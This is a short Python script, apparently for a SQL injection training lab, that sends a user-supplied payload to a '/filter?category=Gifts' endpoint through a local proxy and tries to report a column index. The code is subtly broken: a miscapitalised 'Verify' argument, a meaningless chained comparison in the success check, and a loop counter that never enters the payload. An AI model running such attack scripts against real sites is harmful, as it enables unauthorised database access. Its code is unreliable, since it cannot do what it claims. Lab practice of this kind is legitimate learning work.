import sys
import requests 
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "https://127.0.0.1:8080"
}

def index_guess(url, payload):
    for i in range(1, 50):
        path = "/filter?category=Gifts"
        r = requests.get(url + path + payload,Verify=False, proxies=proxies)  
        
        if r.status_code == 200 in r.text:
            return i
    return None 

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("Input in this format: <url> <payload>")
        sys.exit(1) 

    num = index_guess(url, payload)  
    if num is not None and num >= 1:    
        print(f"The index number is {num}")  
    else:
        print("There is an error or no index for the SQL.")